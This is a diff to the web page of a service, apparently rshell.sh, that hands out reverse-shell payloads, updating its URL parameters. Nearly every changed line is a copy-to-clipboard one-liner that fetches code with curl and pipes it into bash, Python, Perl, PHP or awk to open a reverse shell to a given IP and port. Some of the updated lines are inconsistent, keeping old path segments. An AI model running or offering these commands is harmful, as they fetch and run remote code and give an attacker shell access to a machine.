@@ -41,11 +41,11 @@
 	  </td>
       <td>
 		<button onclick="copyBashXargs()">
-		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345&q=y | xargs bash -c">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/&quotes=single | xargs bash -c">✅</span>
 		</button>
 		<script>
 		  function copyBashXargs() {
-			var bashXargsStr =  "curl -s rshell.sh/127.0.0.1/12345?q=y | xargs bash -c";
+			var bashXargsStr =  "curl -s rshell.sh/127.0.0.1/12345/?quotes=single | xargs bash -c";
 			navigator.clipboard.writeText(bashXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + bashXargsStr);
@@ -57,11 +57,11 @@
       <td>Python3</td>
       <td>
 		<button onclick="copyPythonStdin()">
-		  <span title="Copy: curl -s rshell.sh/python/127.0.0.1/12345 | python">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?lang=python | python">✅</span>
 		</button>
 		<script>
 		  function copyPythonStdin() {
-			var pythonStdinStr =  "curl -s rshell.sh/python/127.0.0.1/12345 | python";
+			var pythonStdinStr =  "curl -s rshell.sh/127.0.0.1/12345?lang=python | python";
 			navigator.clipboard.writeText(pythonStdinStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + pythonStdinStr);
@@ -70,11 +70,11 @@
 	  </td>
       <td>
 		<button onclick="copyPythonXargs()">
-		  <span title="Copy: curl -s rshell.sh/python/127.0.0.1/12345?q=y | xargs python -c">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=python | xargs python -c">✅</span>
 		</button>
 		<script>
 		  function copyPythonXargs() {
-			var pythonXargsStr =  "curl -s rshell.sh/python/127.0.0.1/12345?q=y | xargs python -c";
+			var pythonXargsStr =  "curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=python | xargs python -c";
 			navigator.clipboard.writeText(pythonXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + pythonXargsStr);
@@ -86,11 +86,11 @@
       <td>Perl</td>
       <td>
 		<button onclick="copyPerlStdin()">
-		  <span title="Copy: curl -s rshell.sh/perl/127.0.0.1/12345 | perl">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?lang=perl | perl">✅</span>
 		</button>
 		<script>
 		  function copyPerlStdin() {
-			var perlStdinStr =  "curl -s rshell.sh/perl/127.0.0.1/12345 | perl";
+			var perlStdinStr =  "curl -s rshell.sh/127.0.0.1/12345/?lang=perl | perl";
 			navigator.clipboard.writeText(perlStdinStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + perlStdinStr);
@@ -99,11 +99,11 @@
 	  </td>
       <td>
 		<button onclick="copyPerlXargs()">
-		  <span title="Copy: curl -s rshell.sh/perl/127.0.0.1/12345?q=y | xargs python -e">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=perl | xargs perl -e">✅</span>
 		</button>
 		<script>
 		  function copyPerlXargs() {
-			var perlXargsStr =  "curl -s rshell.sh/perl/127.0.0.1/12345?q=y | xargs perl -e";
+			var perlXargsStr =  "curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=perl | xargs perl -e";
 			navigator.clipboard.writeText(perlXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + perlXargsStr);
@@ -125,11 +125,11 @@
 	  </td>
       <td>
 		<button onclick="copyPHPXargs()">
-		  <span title="Copy: curl -s rshell.sh/php/127.0.0.1/12345?q=y | xargs php -r">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=php | xargs php -r">✅</span>
 		</button>
 		<script>
 		  function copyPHPXargs() {
-			var phpXargsStr =  "curl -s rshell.sh/php/127.0.0.1/12345?q=y | xargs php -r";
+			var phpXargsStr =  "curl -s rshell.sh/php/127.0.0.1/12345/?quotes=single&lang=php | xargs php -r";
 			navigator.clipboard.writeText(phpXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + phpXargsStr);
@@ -151,11 +151,11 @@
 	  </td>
       <td>
 		<button onclick="copyAwkXargs()">
-		  <span title="Copy: curl -s rshell.sh/awk/127.0.0.1/12345?q=y | xargs awk">✅</span>
+		  <span title="Copy: curl -s rshell.sh/awk/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk">✅</span>
 		</button>
 		<script>
 		  function copyAwkXargs() {
-			var awkXargsStr =  "curl -s rshell.sh/awk/127.0.0.1/12345?q=y | xargs awk";
+			var awkXargsStr =  "curl -s rshell.sh/awk/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk";
 			navigator.clipboard.writeText(awkXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + awkXargsStr);
@@ -183,15 +183,15 @@
 	  <th>Description</th>
 	</tr>
 	<tr>
-      <td>q</td>
-      <td>y</td>
-	  <td><a href="/10.0.0.1/1234?q=y">rshell.sh/10.0.0.1/1234?q=y</a></td>
-	  <td>Output wrapped in single quotes.</td>
+      <td>quotes</td>
+      <td>single, double</td>
+	  <td><a href="/10.0.0.1/1234/?quotes=double">rshell.sh/10.0.0.1/1234/?quotes=double</a></td>
+	  <td>Output wrapped in double quotes.</td>
 	</tr>
 	<tr>
-      <td>s</td>
+      <td>shell</td>
       <td>See, <a href="#SupportedShells">Supported Shells</a></td>
-	  <td><a href="/python/10.0.0.1/1234?s=zsh">rshell.sh/python/10.0.0.1/1234?s=zsh</a></td>
+	  <td><a href="/10.0.0.1/1234/?lang=python&shell=zsh">rshell.sh/python/10.0.0.1/1234/?lang=python&shell=zsh</a></td>
 	  <td>Type of reverse shell that is sent.</td>
 	</tr>
   </table>
@@ -224,7 +224,7 @@
 	</tr>
   </table>
 
-<h3><u>Tips</u></h3>
+<h3><u>Extras</u></h3>
 <ul>
 <li>Python Shell Reset</li>
 <pre>
@@ -232,7 +232,7 @@ curl -s rshell.sh/reset
 </pre>
 <li>Command Line Friendly Help Menu</li>
 <pre>
-curl -s rshell.sh/help
+curl -s rshell.sh/help | less
 </pre>
 </ul>
 
